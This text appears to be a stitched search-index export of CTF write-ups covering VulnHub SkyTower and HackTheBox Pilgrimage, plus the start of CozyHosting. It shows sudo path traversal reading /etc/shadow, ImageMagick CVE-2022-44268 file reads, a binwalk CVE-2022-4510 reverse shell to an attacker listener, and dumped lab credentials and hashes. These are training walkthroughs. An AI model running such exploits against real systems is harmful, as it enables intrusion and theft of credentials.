| john@skytech.com | hereisjohn || 2 | sara@skytech.com | ihatethisjob || 3 | william@skytech.com | senseable |+----+---------------------+--------------+3 rows in set (0.00 sec)mysql>```{: .nolineno}Now as I got the credentials I tried to login to sara same problem that we faces with john earlier so I have to delete the `.bashrc file` for no connection drop.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/SkyTower]â””â”€$ ssh sara@127.0.0.1 -p 2222 The authenticity of host '[127.0.0.1]:2222 ([127.0.0.1]:2222)' cant be established.ECDSA key fingerprint is SHA256:QYZqyNNW/Z81N86urjCUIrTBvJ06U9XDDzNv91DYaGc.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '[127.0.0.1]:2222' (ECDSA) to the list of known hosts.sara@127.0.0.1s password: Permission denied, please try again.sara@127.0.0.1s password: Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Fri Jun 20 08:19:23 2014 from localhostFunds have been withdrawnConnection to 127.0.0.1 closed. â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/SkyTower]â””â”€$ ssh sara@127.0.0.1 -p 2222 /bin/bashsara@127.0.0.1s password: whoami sarals -altotal 20drwx------ 2 sara sara 4096 Jun 20 2014 .drwxr-xr-x 5 root root 4096 Jun 20 2014 ..-rw-r--r-- 1 sara sara 220 Jun 20 2014 .bash_logout-rw-r--r-- 1 sara sara 3437 Jun 20 2014 .bashrc-rw-r--r-- 1 sara sara 675 Jun 20 2014 .profilerm .bashrcexit â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/SkyTower]â””â”€$ ssh sara@127.0.0.1 -p 2222 sara@127.0.0.1 is password: Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Tue Sep 12 03:55:37 2023 from localhostsara@SkyTower:~$ ls -altotal 16drwx------ 2 sara sara 4096 Sep 12 03:56 .drwxr-xr-x 5 root root 4096 Jun 20 2014 ..-rw-r--r-- 1 sara sara 220 Jun 20 2014 .bash_logout-rw-r--r-- 1 sara sara 675 Jun 20 2014 .profilesara@SkyTower:~$ sudo -lMatching Defaults entries for sara on this host: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser sara may run the following commands on this host: (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*sara@SkyTower:~$ sudo -u root /bin/cat /accounts/../root/.bash_historylsscreen -xlscd /var/www/lscat login.php vi login.php aptitude search php|grep mysqlaptitude install php5-mysqldhclient/sbin/ifconfig aptitude install php5-mysqldhclientlsvi login.php haltsara@SkyTower:~$ sudo -u root /bin/ls /accounts/../root/flag.txtsara@SkyTower:~$ sudo -u root /bin/cat /accounts/../root/flag.txtCongratz, have a cold one to celebrate!root password is theskytowersara@SkyTower:~$ sudo -u root /bin/cat /accounts/../etc/shadowroot:$6$rKYhh57q$AVs1wNVSbE5K.IU1Wp9l7Ndg3iPlB7yczctQD6OL9fBZir2ppGDA6v0Vx17xjg.b3zu6mkAVpEN2BuG3wvS2l/:16241:0:99999:7:::daemon:*:16241:0:99999:7:::bin:*:16241:0:99999:7:::sys:*:16241:0:99999:7:::sync:*:16241:0:99999:7:::games:*:16241:0:99999:7:::man:*:16241:0:99999:7:::lp:*:16241:0:99999:7:::mail:*:16241:0:99999:7:::news:*:16241:0:99999:7:::uucp:*:16241:0:99999:7:::proxy:*:16241:0:99999:7:::www-data:*:16241:0:99999:7:::backup:*:16241:0:99999:7:::list:*:16241:0:99999:7:::irc:*:16241:0:99999:7:::gnats:*:16241:0:99999:7:::nobody:*:16241:0:99999:7:::libuuid:!:16241:0:99999:7:::sshd:*:16241:0:99999:7:::mysql:!:16241:0:99999:7:::john:$6$a39powbs$ditVKZ1waa6vJEh3BG1d5jLv/uADKcl.r1kcA.XKyhNfJoiDhSdwmSZel3V5cZ/S6ec3wd8rdNA2dOznTXhl0/:16198:0:99999:7:::sara:$6$2PvpHNG0$hbaMRd5fZhWMDHyyhGHINSy.qBHnvP4QW1k9RSwv.pQM6SoZey53C7S7aF6263ae6qx5TwVA6sahf5tebUqvY1:16198:0:99999:7:::william:$6$c3VykdoT$qRUKl1e77skTm0sLHavRSp8mUJfMIPrJBovrXC8o9GY8/P7gpasSbvtqA0rn9.HyxjKhSVji8/CzHNFLit3GU1:16241:0:99999:7:::sara@SkyTower:~$```{: .nolineno}> ### This machine was easy I learned about the proxytunnel command and its usage !!{: .prompt-tip }> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Pilgrimage", "url": "/posts/Pilgrimage/", "categories": "HackTheBox", "tags": "PrivEsc, Public Exploit, git", "date": "2023-09-15 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pilgrimage]â””â”€$ sudo nmap -sC -sV -T4 10.10.11.219 -oN Nmap_results.txt[sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org )...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pilgrimage]â””â”€$ sudo nmap -sC -sV -T4 10.10.11.219 -oN Nmap_results.txt[sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 09:49 ISTNmap scan report for 10.10.11.219Host is up (0.17s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey: | 3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)| 256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)|_ 256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)80/tcp open http nginx 1.18.0| http-vulners-regex: | /main.shtml: | cpe:/a:igor_sysoev:nginx:1.18.0|_ cpe:/a:nginx:nginx:1.18.0|_http-title: Did not follow redirect to http://pilgrimage.htb/|_http-server-header: nginx/1.18.0Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸Now lets set the hosts file name as pilgrimage.htb for the IP address that we got and lets hover over the site now â¤µï¸![Untitled](/Vulnhub-Files/img/Pilgrimage/Untitled%201.png)After directory or files bruteforcing I got the .git file so lets dump that with git-dumper Tool .```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pilgrimage]â””â”€$ git-dumper http://pilgrimage.htb/.git /git Warning: Destination '.' is not empty[-] Testing http://pilgrimage.htb/.git/HEAD [200][-] Testing http://pilgrimage.htb/.git/ [403][-] Fetching common files[-] Fetching http://pilgrimage.htb/.git/COMMIT_EDITMSG [200][-] Fetching http://pilgrimage.htb/.git/description [200][-] Fetching http://pilgrimage.htb/.git/hooks/commit-msg.sample [200][-] Fetching http://pilgrimage.htb/.git/hooks/post-commit.sample [404][-] http://pilgrimage.htb/.git/hooks/post-commit.sample responded with status code 404[-] Fetching http://pilgrimage.htb/.gitignore [404][-] http://pilgrimage.htb/.gitignore responded with status code 404[-] Fetching http://pilgrimage.htb/.git/hooks/applypatch-msg.sample [200][-] Fetching http://pilgrimage.htb/.git/hooks/post-update.sample [200][-] Fetching http://pilgrimage.htb/.git/hooks/pre-applypatch.sample [200]...```{: .nolineno}Now on git directory I got different files â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pilgrimage/git]â””â”€$ lsassets dashboard.php index.php login.php logout.php magick register.php vendor```{: .nolineno}I saw `magick` which is used in editing images so lets enum further :```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pilgrimage/git]â””â”€$ ./magick -versionVersion: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.orgCopyright: (C) 1999 ImageMagick Studio LLCLicense: https://imagemagick.org/script/license.phpFeatures: Cipher DPC HDRI OpenMP(4.5) Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlibCompiler: gcc (7.5)```{: .nolineno}Now lets find an exploit for this and I got it which I wanted â¤µï¸1. https://github.com/Vulnmachines/imagemagick-CVE-2022-442682. https://www.exploit-db.com/exploits/512613. https://github.com/voidz0r/CVE-2022-44268```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pilgrimage]â””â”€$ python3 poc.py usage: poc.py [-h] [-i INPUT] [-o OUTPUT] [-r READ] {generate,parse}poc.py: error: the following arguments are required: action â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pilgrimage]â””â”€$ python3 poc.py generate -o passwd.png -r /etc/passwd â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pilgrimage]â””â”€$ ls -al passwd.png -rw-r--r-- 1 kali kali 181 Sep 8 11:43 passwd.png```{: .nolineno}Now lets upload this payload png file into the site and lets download the shrink image which we get after uploading this image â¤µï¸![Untitled](/Vulnhub-Files/img/Pilgrimage/Untitled%202.png)After uploading I got this image link so lets download this image now from this link â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pilgrimage]â””â”€$ wget http://pilgrimage.htb/shrunk/64fabc0bacede.png --2023-09-08 11:47:01-- http://pilgrimage.htb/shrunk/64fabc0bacede.pngResolving pilgrimage.htb (pilgrimage.htb)... 10.10.11.219Connecting to pilgrimage.htb (pilgrimage.htb)|10.10.11.219|:80... connected.HTTP request sent, awaiting response... 200 OKLength: 1082 (1.1K) [image/png]Saving to: â€˜64fabc0bacede.pngâ€™64fabc0bacede.png 100%[=======================================================>] 1.06K --.-KB/s in 0s 2023-09-08 11:47:01 (44.5 MB/s) - â€˜64fabc0bacede.pngâ€™ saved [1082/1082]```{: .nolineno}Now lets read our `/etc/passwd` payload that we imbedded into the exploit image passwd.png â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pilgrimage]â””â”€$ python3 poc.py parse -i 64fabc0bacede.png 2023-09-08 14:10:52,191 - INFO - chunk IHDR found, value = b'\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x05\\x08\\x00\\x00\\x00\\x00'2023-09-08 14:10:52,191 - INFO - chunk gAMA found, value = b'\\x00\\x00\\xb1\\x8f'2023-09-08 14:10:52,191 - INFO - chunk cHRM found, value = b'\\x00\\x00z&\\x00\\x00\\x80\\x84\\x00\\x00\\xfa\\x00\\x00\\x00\\x80\\xe8\\x00\\x00u0\\x00\\x00\\xea`\\x00\\x00:\\x98\\x00\\x00\\x17p'2023-09-08 14:10:52,191 - INFO - chunk bKGD found, value = b'\\x00\\xff'2023-09-08 14:10:52,191 - INFO - chunk tIME found, value = b\"\\x07\\xe7\\t\\x08\\x06\\x0f'\"2023-09-08 14:10:52,191 - INFO - chunk zTXt found, value = b'Raw profile type\\x00\\x00H\\x89\\xa5V\\xe7\\x15\\xa30\\x0c\\xfe\\xaf)n\\x04p\\x91\\xf08\\t!\\xfb\\x8fp\\x9f\\xe4JI\\xc2\\xbbK\\x9e\\xb1Q\\xef\\x86\\xe8\\x0f~s\\xf0B\\xe2\\xf8\\xcdo\\t\\xfe!\\x8b\\x7f\\xf8)\\xaf\\x0eu\\xef\\xf1\\xcc\\x8e\\x13o\\xb6\\xcf\\xe2y\\x99\\x1e\\x1cx\\xe6\\xc8/\\x02\\xd1V\\x84\\xccyUT\\xc6@P\\x14/\\x0e\\xbb\\xcfb\\xae`\\xeeM\\xbc\\x81a\\xc5\\x12\\x05@C!6\\xd1.\\xaf.\\xe0\\xb3(\\x02\\xf2 \\n\\x04I|\\x11\\xe5\\xf3\\xaa0P\\x07\\x8e\\xc2gQd\\x1e_\\x88\\x02\\xac\\nCt\\xf1Z\\xcc/\\xabC\\x07\\xebG\\x98\\t\\xa6\\xafFo\\x88\\xa0\\xb4\\xa0\\xa7\\xbc:t\\xb4\\x9d\\x06\\xe3G\\x82\\x9f\\x91\\x01Ed\\xaf\\xa1\\xc8]A\\xd6]\\xb3\\xf5WC]Gi\\x87\\xff\\xdd\"2i\\x93\\xca\"\\xa9u\\xa0\\xaf\\xcf\\x11wl\\x17\\xfa\\xe1\\x80\\xfd\\xdcK\\x1bY\\xb0Z\\xe3\\xf8\\xfa\\xac\\x14\\xd4I\\x06\\x87\\xecw\\xb3\\x8a\\x9cU\\xdf\\x93@:5=\\xa1>+:c\\x87\\xb4\\x0f\\xf0}Z\\xe8[\\xc52:\\xbe\\x8d\\xdd/9v\\x1c\\xd08*(\\x88h\\x84\\x89\\x9f\\x83\\xe6\\xb9\\xec\\xce\\x1f\\x99\\xa600\\xf1s_yz!\\x90\\xda\\xe3V\\xfd\\x8f\\xb5\\xb2\\x17s\\xc7^:\\x1b,Z\\x10^\\x89\\x90\\xe68\\xd8\\xeb\\xca\\xee\\xcf\\xf6FG#\\x134\\xfe\\xb3m\\xc7\\xe1\\xafD\\xbex\\xee\\xa4_\\x92\\xc5\\x12\\xdb\\xd3U\\xde\\xe8[m\\xfc\\xce\\x9bu\\x83\\xa9\\xa7\\xdd-\\xaf\\xfa\\x82\\xedy\\x8a\\x1f#Q\\xd8r\\x13)\\x1f/\\xf6\\xf5\\xb4\\xe9\\x18y\\xd8\\x84L\\xfa\\xfa?\\xd9\\xa3!B\\xd1\\x1as\\x1d\\xc6\\xfeT\\xaa\\xba\\x9d:MW\\x8aK\\xfem\\x1f\\x118\\x0e\"\\xae>\\xefN\\x15\\xed\\xad,#:\\x12\\x90I also checked the git files source code and I got this sqlite credentials path file inside register.php file â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pilgrimage/git]â””â”€$ cat register.php prepare(\"INSERT INTO `users` (username,password) VALUES (?,?)\"); $status = $stmt->execute(array($username,$password)); if($status) { $_SESSION['user'] = $username; header(\"Location: /dashboard.php\"); } else { header(\"Location: /register.php?message=Registration failed&status=fail\"); }}?>```{: .nolineno}Now lets acccess this file with previous method as we got /etc/passwd file â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pilgrimage]â””â”€$ python3 poc.py generate -o sqlite_cred.png -r /var/db/pilgrimage â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pilgrimage]â””â”€$ wget http://pilgrimage.htb/shrunk/64fae8323d981.png --2023-09-08 14:54:04-- http://pilgrimage.htb/shrunk/64fae8323d981.pngResolving pilgrimage.htb (pilgrimage.htb)... 10.10.11.219Connecting to pilgrimage.htb (pilgrimage.htb)|10.10.11.219|:80... connected.HTTP request sent, awaiting response... 200 OKLength: 1117 (1.1K) [image/png]Saving to: â€˜64fae8323d981.pngâ€™64fae8323d981.png 100%[=======================================================>] 1.09K --.-KB/s in 0s 2023-09-08 14:54:05 (177 MB/s) - â€˜64fae8323d981.pngâ€™ saved [1117/1117]â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pilgrimage]â””â”€$ identify -verbose 64faea203f664.png Image: 64faea203f664.png Format: PNG (Portable Network Graphics) Geometry: 5x5 Class: PseudoClass Type: grayscale Depth: 8 bits-per-pixel component Channel Depths: Gray: 8 bits Channel Statistics: Gray: Minimum: 43690.00 (0.6667) Maximum: 53199.00 (0.8118) Mean: 51245.80 (0.7820) Standard Deviation: 2376.38 (0.0363) Colors: 256 0: ( 0, 0, 0)\t black 1: ( 1, 1, 1)\t #010101 2: ( 2, 2, 2)\t #020202 3: ( 3, 3, 3)\t #030303 4: ( 4, 4, 4)\t #040404 5: ( 5, 5, 5)\t #050505 6: ( 6, 6, 6)\t #060606... ... ... 254: (254,254,254)\t #FEFEFE 255: (255,255,255)\t white Gamma: 0.45455 Chromaticity: red primary: (0.64,0.33) green primary: (0.3,0.6) blue primary: (0.15,0.06) white point: (0.3127,0.329) Filesize: 1.2Ki Interlace: No Orientation: Unknown Background Color: white Border Color: #DFDFDF Matte Color: #BDBDBD Page geometry: 5x5+0+0 Compose: Over Dispose: Undefined Iterations: 0 Compression: Zip Png:IHDR.color-type-orig: 0 Png:IHDR.bit-depth-orig: 8 Raw profile type: 2048053514c69746520666f726d61742033001000010100402020000000540000000500000000000000000000000400000004000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000054002e4b910d0ff800040eba000f650fcd0eba0f3800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000...6167652e6874622f736872756e6b2f363466616537643533353761652e706e67 Date:create: 2023-09-08T09:32:16+00:00 Date:modify: 2023-09-08T09:32:16+00:00 Date:timestamp: 2023-09-08T09:32:16+00:00 Signature: c5f89321fda9ed52d1b6fdba39f2865e833cf6354df82b6d27fcd4ce9e75f83b Tainted: False User Time: 0.010u Elapsed Time: 0m:0.000322s Pixels Per Second: 75.8Ki```{: .nolineno}here I used the cyberchef tool to decode this much hex output into a sqlite format â¤µï¸![Untitled](/Vulnhub-Files/img/Pilgrimage/Untitled%203.png)Now I downloaded the sqlite file and opened it with sqlite Tools in kali and got the credentials â¤µï¸![Untitled](/Vulnhub-Files/img/Pilgrimage/Untitled%204.png)Now I have the credentials â¤µï¸```bashemily : abigchonkyboi123```{: .nolineno}## SSH Login â¤µï¸Now lets try to login with ssh :```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pilgrimage]â””â”€$ ssh emily@pilgrimage.htb emily@pilgrimage.htb`s password: Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.emily@pilgrimage:~$```{: .nolineno}got the user.txt file â¤µï¸```bashemily@pilgrimage:~$ cat user.txtb3e8c829c80641db2b04cce05a39febeemily@pilgrimage:~$```{: .nolineno}Now while checking the processes I Noticed this file ->![Untitled](/Vulnhub-Files/img/Pilgrimage/Untitled%205.png)***/bin/bash /usr/sbin/malwarescan.sh***Now lets see what it is doing ->```bashemily@pilgrimage:/$ cat /usr/sbin/malwarescan.sh#!/bin/bashblacklist=(\"Executable script\" \"Microsoft executable\")/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do\tfilename=\"/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo \"$FILE\" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e is/^.*CREATE //p')\"\tbinout=\"$(/usr/local/bin/binwalk -e \"$filename\")\" for banned in \"${blacklist[@]}\"; do\t\tif [[ \"$binout\" == *\"$banned\"*]]; then\t\t\t/usr/bin/rm \"$filename\"\t\t\tbreak\t\tfi\tdonedoneemily@pilgrimage:/$ ls -al /usr/sbin/malwarescan.sh-rwxr--r-- 1 root root 474 Jun 1 19:14 /usr/sbin/malwarescan.shemily@pilgrimage:/$```{: .nolineno}Here this program is running binwalk so lets check which version of binwalk it is using â¤µï¸```bashemily@pilgrimage:/$ binwalk --helpBinwalk v2.3.2Craig Heffner, ReFirmLabshttps://github.com/ReFirmLabs/binwalkUsage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...Signature Scan Options: -B, --signature Scan target file(s) for common file signatures -R, --raw= Scan target file(s) for the specified sequence of bytes...```{: .nolineno}Since it is version 2.3.2 and from web I got an exploit of this version only so lets try it out this exploit â¤µï¸ https://www.exploit-db.com/exploits/51249![Untitled](/Vulnhub-Files/img/Pilgrimage/Untitled%206.png)```bashemily@pilgrimage:/tmp$ python3 exploit.py /var/www/pilgrimage.htb/shrunk/64faf96b8b4f4.png 10.10.14.25 4444################################################------------------CVE-2022-4510----------------################################################--------Binwalk Remote Command Execution--------------Binwalk 2.1.2b through 2.3.2 included-----------------------------------------------------################################################----------Exploit by: Etienne Lacoche--------------------Contact Twitter: @electr0sm0g----------------------------Discovered by:-------------------------Q. Kaiser, ONEKEY Research Lab------------------Exploit tested on debian 11------------################################################You can now rename and share binwalk_exploit and start your local netcat listener.emily@pilgrimage:/tmp$ lsbinwalk_exploit.pngexploit.pysystemd-private-4dfeccbe37e14f1094cda99040197a4d-systemd-logind.service-fSWTvfsystemd-private-4dfeccbe37e14f1094cda99040197a4d-systemd-timesyncd.service-JCrdOivmware-root_581-3979839684emily@pilgrimage:/tmp$```{: .nolineno}Now lets copy this binwalk_exploit.png into the images location that is `/var/www/pilgrimage.htb/shrunk/` â¤µï¸```bashemily@pilgrimage:/tmp$ cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/emily@pilgrimage:/tmp$```{: .nolineno}Now in attackers machine lets start the Listener on port 4444 â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pilgrimage]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.25] from (UNKNOWN) [10.10.11.219] 51598python3 -c 'import pty;pty.spawn(\"/bin/bash\")'root@pilgrimage:~/quarantine# whoamiwhoamirootroot@pilgrimage:~/quarantine# ididuid=0(root) gid=0(root) groups=0(root)root@pilgrimage:~/quarantine# cd /rootcd /rootroot@pilgrimage:~# ls -alls -altotal 40drwx------ 5 root root 4096 Jun 8 00:10 .drwxr-xr-x 18 root root 4096 Jun 8 00:10 ..lrwxrwxrwx 1 root root 9 Feb 10 2023 .bash_history -> /dev/null-rw-r--r-- 1 root root 571 Apr 11 2021 .bashrcdrwxr-xr-x 3 root root 4096 Jun 8 00:10 .config-rw-r--r-- 1 root root 93 Jun 7 20:11 .gitconfigdrwxr-xr-x 3 root root 4096 Jun 8 00:10 .local-rw-r--r-- 1 root root 161 Jul 9 2019 .profiledrwxr-xr-x 4 root root 4096 Sep 8 20:46 quarantine-rwxr-xr-x 1 root root 352 Jun 1 19:13 reset.sh-rw-r----- 1 root root 33 Sep 8 14:07 root.txtroot@pilgrimage:~# cat root.txtcat root.txt3abcaf52ed8d30173b8dc3c6fcb3461croot@pilgrimage:~# ip aip a1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever2: eth0: mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:50:56:b9:1a:54 brd ff:ff:ff:ff:ff:ff altname enp3s0 altname ens160 inet 10.10.11.219/23 brd 10.10.11.255 scope global eth0 valid_lft forever preferred_lft foreverroot@pilgrimage:~#```{: .nolineno}I got the root !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Cozyhosting", "url": "/posts/CozyHosting/", "categories": "HackTheBox", "tags": "Command Injection, GTFObin, PostgreSQL, Session Hijacking, springframework", "date": "2023-09-15 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/CozyHosting]â””â”€$ sudo nmap -sC -sV -T4 -oN Nmap_results.txt 10.10.11.230[sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/CozyHosting]â””â”€$ sudo nmap -sC -sV -T4 -oN Nmap_results.txt 10.10.11.230[sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 14:37 ISTNmap scan report for 10.10.11.230Host is up (0.26s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)|_ 256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://cozyhosting.htbService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸Lets check the port 80 after changing its hosts file and giving it a domain name â†’![Untitled](/Vulnhub-Files/img/CozyHosting/Untitled%201.png)I also got the login page but it is not vulnerable so I moved on to another pages â†’![Untitled](/Vulnhub-Files/img/CozyHosting/Untitled%202.png)I found this error on this page â†’![Untitled](/Vulnhub-Files/img/CozyHosting/Untitled%203.png)After searching on web about this error I got this page â†’[https://springhow.com/this-application-has-no-explicit-mapping-for-error/](https://springhow.com/this-application-has-no-explicit-mapping-for-error/)here it is using org.springframework.boot so I used this into the directory or files bruteforcing,Lets see the directory or files bruteforcing of Spring Boot file system â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/CozyHosting]â””â”€$ feroxbuster -u http://cozyhosting.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt -t 100 -k --depth 2 -x php,html,txt,log -C 404,403 -o ferox_spring_boot ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben \"epi\" Risher ðŸ¤“ ver: 2.10.0â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸŽ¯ Target Url â”‚ http://cozyhosting.htb/ ðŸš€ Threads â”‚ 100 ðŸ“– Wordlist â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt ðŸ’¢ Status Code Filters â”‚ [404, 403] ðŸ’¥ Timeout (secs) â”‚ 7 ðŸ¦¡ User-Agent â”‚ feroxbuster/2.10.0 ðŸ’‰ Config File â”‚ /etc/feroxbuster/ferox-config.toml ðŸ”Ž Extract Links â”‚ true ðŸ’¾ Output File â”‚ ferox_spring_boot ðŸ’² Extensions â”‚ [php, html, txt, log] ðŸ HTTP methods â”‚ [GET] ðŸ”“ Insecure â”‚ true ðŸ”ƒ Recursion Depth â”‚ 2â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ Press [ENTER] to use the Scan Management Menuâ„¢â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€404 GET 1l 2w -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter200 GET 1l 1w 15c http://cozyhosting.htb/actuator/health200 GET 1l 1w 634c http://cozyhosting.htb/actuator200 GET 1l 1w 242c http://cozyhosting.htb/actuator/sessions200 GET 1l 13w 487c http://cozyhosting.htb/actuator/env/path200 GET 1l 120w 4957c http://cozyhosting.htb/actuator/env200 GET 1l 13w 487c http://cozyhosting.htb/actuator/env/lang200 GET 1l 13w 487c http://cozyhosting.htb/actuator/env/home200 GET 295l 641w 6890c http://cozyhosting.htb/assets/js/main.js200 GET 43l 241w 19406c http://cozyhosting.htb/assets/img/pricing-business.png200 GET 38l 135w 8621c http://cozyhosting.htb/assets/img/logo.png200 GET 29l 174w 14774c http://cozyhosting.htb/assets/img/pricing-ultimate.png200 GET 38l 135w 8621c http://cozyhosting.htb/assets/img/favicon.png200 GET 29l 131w 11970c http://cozyhosting.htb/assets/img/pricing-free.png200 GET 97l 196w 4431c http://cozyhosting.htb/login200 GET 1l 108w 9938c http://cozyhosting.htb/actuator/mappings200 GET 73l 470w 37464c http://cozyhosting.htb/assets/img/values-1.png200 GET 83l 453w 36234c http://cozyhosting.htb/assets/img/values-3.png200 GET 1l 542w 127224c http://cozyhosting.htb/actuator/beans200 GET 1l 313w 14690c http://cozyhosting.htb/assets/vendor/aos/aos.js200 GET 1l 218w 26053c http://cozyhosting.htb/assets/vendor/aos/aos.css200 GET 79l 519w 40905c http://cozyhosting.htb/assets/img/values-2.png200 GET 81l 517w 40968c http://cozyhosting.htb/assets/img/hero-img.png200 GET 2397l 4846w 42231c http://cozyhosting.htb/assets/css/style.css200 GET 1l 625w 55880c http://cozyhosting.htb/assets/vendor/glightbox/js/glightbox.min.js200 GET 14l 1684w 143706c http://cozyhosting.htb/assets/vendor/swiper/swiper-bundle.min.js200 GET 34l 172w 14934c http://cozyhosting.htb/assets/img/pricing-starter.png200 GET 7l 1222w 80420c http://cozyhosting.htb/assets/vendor/bootstrap/js/bootstrap.bundle.min.js200 GET 2018l 10020w 95609c http://cozyhosting.htb/assets/vendor/bootstrap-icons/bootstrap-icons.css200 GET 7l 2189w 194901c 